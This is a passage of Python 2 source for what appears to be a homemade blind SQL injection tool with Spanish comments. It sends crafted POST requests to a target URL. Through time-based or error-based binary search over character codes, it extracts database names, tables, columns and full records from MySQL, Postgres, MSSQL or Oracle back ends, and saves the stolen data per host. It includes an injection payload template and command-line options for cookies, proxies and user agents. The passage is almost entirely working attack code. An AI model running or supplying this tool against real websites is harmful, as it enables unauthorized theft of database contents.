						for renglon in xrange(1,nr):
							#'MySQL': 'and ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}',
							if self.Which=="Postgres":
								msg = self.RecordQuerys[self.Which].format(ccname,'',ttname,renglon,"{0}","{1}")
							msg = self.RecordQuerys[self.Which].format(ccname,ldbn,ttname,renglon,"{0}","{1}")
						print nr,"Registros"
		else:
			print self.columnasElegidas
			for ldbn in self.listaBases: #Se recorre la lista que contiene las bases de datos
				for ttname in self.listaTablas: # Se recorre la lista que contiene las tablas deseadas
					for ccname in self.columnasElegidas: #Se recorre la lista que contiene las columnas a extraer
						print "="*20
						print "="*4,ccname,"="*4
						print "="*20
						#Cuenta cuantos registros tiene una columna
						#payload = self.numRegisters[self.Which]
						if self.Which=="Postgres":
							payload = self.numRegisters[self.Which].format("",ttname,"{0}")
						else:
							payload = self.numRegisters[self.Which].format(ldbn,ttname,"{0}")
						nr = self.CantidadRegistros(ppload=payload)
						for renglon in xrange(nr):
							#'MySQL': 'and ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}',
							if self.Which=="Postgres":
								msg = self.RecordQuerys[self.Which].format(ccname,'',ttname,renglon,"{0}","{1}")
								#print msg
							else:
								msg = self.RecordQuerys[self.Which].format(ccname,ldbn,ttname,renglon,"{0}","{1}")
							#print "Peticion",msg
							if self.Which=='Postgres':
								lengthMsg = self.TamrecordQuery[self.Which].format(ccname,'',ttname,"{0}","{1}")
							else:
								lengthMsg = self.TamrecordQuery[self.Which].format(ccname,ldbn,ttname,"{0}","{1}")
							#print lengthMsg
							longRecord = self.LongitudRegistro(tipo="registros",ofset=renglon,ppd=lengthMsg)
							#### Aqui hacemos uso de otra funciona para que busque el caracter por medio de iteraciones de la posicion y el código Ascii
							lleettrraass = self.getRecords(pppp=msg,offse=renglon,longitud=longRecord)
							print ""
							#print "\033[1;36m",lleettrraass,"\033[0m"
							#print ""

	def getRecords(self,pppp="",offse="",longitud=""):
		letras = ""
		for l in xrange(1,longitud+1):
#			print pppp.format(offset,100)
			liminf = 31
			limsup = 127
			medio = (limsup + liminf)//2
			found = False
			#print "Offset: {0} Position:{1}".format(offse,l)
			#sleep(2)
			while True:
				self.dataTempo = self.datos.copy()
				query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,pppp,self.newSuffix),offset=offse,pos=l,cAscii=medio,records=True)
				#print query
				#print "Offset: {0} Position:{1}".format(offse,l)
				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
				if self.Based == "time":
					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
				else:
					cumple = Attempt.content == self.GoodRequest.content
				if found:
#					if chr(medio) != "," and not self.verbosity:
#					if chr(medio) != ",":
					self.showCharacter(chr(medio))
#					else:
#						print ""
					letras+=chr(medio)
					break
				#if self.GoodRequest.content==Attempt.content:
				if cumple:
					#print "Menor"
					liminf = liminf
					limsup = medio
					medio = (limsup + liminf)//2
				#elif not(Attempt.content==self.GoodRequest.content):
				elif not cumple:
					#print "Mayor"
					liminf = medio
					limsup = limsup
					medio = (limsup + liminf)//2
				if (limsup-liminf)-1==0:
					found = True
		return letras

	def Begin(self):
		print "(>¬.¬)>\n"+"="*20
		print self.Based
		if self.Based == "time":
			self.PayloadsAttempt = timebased.PayloadsAttempt
			self.PayloadsDBnames = timebased.PayloadsDBnames
			self.RegisterLength = timebased.RegisterLength
			self.TableLength = timebased.TableLength
			self.TablesName = timebased.TablesName
			self.ColumnLength = timebased.ColumnLength
			self.ColumnNames= timebased.ColumnNames
			self.numRegisters = timebased.numRegisters
			self.RecordQuerys = timebased.RecordQuerys
			self.TamrecordQuery = timebased.TamrecordQuery
		else:
			self.PayloadsAttempt = errorbased.PayloadsAttempt
			self.PayloadsDBnames = errorbased.PayloadsDBnames
			self.RegisterLength = errorbased.RegisterLength
			self.TableLength = errorbased.TableLength
			self.TablesName = errorbased.TablesName
			self.ColumnLength = errorbased.ColumnLength
			self.ColumnNames= errorbased.ColumnNames
			self.numRegisters = errorbased.numRegisters
			self.RecordQuerys = errorbased.RecordQuerys
			self.TamrecordQuery = errorbased.TamrecordQuery

		#print self.PayloadsDBnames
		#exit(1)
		#sleep(1)
		if self.method:#GET
			pass
		#POST Method
		else:
			if not self.YaExiste: # If not exists files with records of previous scan
				#POST Requests
				self.PostInjection()
				# Remove Duplicate values
				self.rmDupValue()
				#Identify DB and show data injection if exists
				self.Whatis()
				if self.Which == "Unknown":
					exit(1)
				# Set a conditional to validate an existing log file generated previously
				if self.dnames:
					self.getDelimiters()
					self.getPostDBnames()
					if self.tnames:
						self.getPostTables()
				else: exit(1)
			else: # If a scanning was previously did it
				self.showData(Previo=True)
				if self.dnames:
					self.getDelimiters()
					if self.Which == 'Unknown':
						print "Target not vulnerable"
						exit(1)
					self.getPostDBnames()
				else:
					self.getDelimiters()
					if self.Which == 'Unknown':
						print "Target not vulnerable"
						exit(1)
				if self.tnames and not self.cnames and not self.rnames:
					self.getPostTables()
				if self.tnames and self.cnames and not self.rnames:
					self.getPostColumns()
				if self.tnames and self.cnames and self.rnames:
					self.getRowsRecords()
					# Hay que serializar los datos
					#print "Conociendo las columnas \n\n"
					#
					#self.getRowsRecords()
				#print "Ya se hizo un escaneo previo"
				exit(1)

	def CreateFiles(self):
		self.hname = self.server.split("/")[2]
		self.aData = self.server.split("/")[3]
		self.fullPath = self.reportDir+""+self.hname+"/"+self.aData
		print self.fullPath
		#########################################################################
		##  First, we check if exists files previously generated by the tools  ##
		#########################################################################
		if isdir(self.reportDir+""+self.hname):
			pass
		else:
			try:
				mkdir(self.reportDir+""+self.hname)
			except:
				pass
		if isdir(self.fullPath):
			pass
		else:
			try:
				mkdir(self.fullPath)
			except:
				pass
		if isfile(self.fullPath+"/"+self.succesfullQuery) and isfile(self.fullPath+"/"+self.dataXtracted):
			self.YaExiste = True
		else:
			try:
				f = open(self.fullPath+"/"+self.succesfullQuery,"a").close()
				f = open(self.fullPath+"/"+self.dataXtracted,"a").close()
			except:
				pass

def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"ho:v",["v","request=","anduin=","cookies=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db','based=',"time="])
	except GetoptError:
		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
		#Server
		elif opt in ('--request'):
			print vals
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--anduin'):
			print ">>",vals
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookies'):
			print vals
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--dbname':
			try:
				ddd = vals.split(',')
			except:
				ddd="all"
			inject.searchTbname(True)
			inject.setDBname(ddd)
		elif opt == '-v':
			print "Verbose"
			inject.setVerbosity(True)
		elif opt == '--db':
			inject.searchDbname(True)
		#Proxy params
		elif opt == '--proxy':
			inject.setProxy(vals)
		elif opt == '--server':
			if vals not in ('Generic','MySQL','Postgres','Mssql','Oracle'):
				print '<{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
				print "You must insert some DBs strings: "+" ,".join(('Generic','MySQL','Postgres','Mssql','Oracle'))
				exit(1)
			inject.setDBMS(vals)
		#Get table specified
		elif opt == '--tables':
			try:
				tbles = vals.split(',')
			except:
				tbles="all"
			inject.searchColumns(True)
			inject.setTables(tbles)
		#Get column specified
		elif opt == '--columns':
			try:
				clumns = vals.split(',')
			except:
				clumns="all"
			inject.searchRecords(True)
			inject.setColumns(clumns)
		# User define which Technique will be used
		elif opt == '--based':
			inject.setBased(vals)
		elif opt == '--time':
			inject.setTime(vals)
		#Option not valid
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
				exit(1)
		else:
			print '<{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			exit(1)
	else:
		main()



def main():
	# Create Directory and Files used for reporting
	inject.CreateFiles()
	inject.Begin()

if __name__ == "__main__":
	if isdir(getenv("HOME")+"/sql/"):
		pass
	else:
		try:
			p = getenv("HOME")+"/sql/"
			mkdir(p)
		except:
			pass
	inject = Injection()
	Opciones(argv)
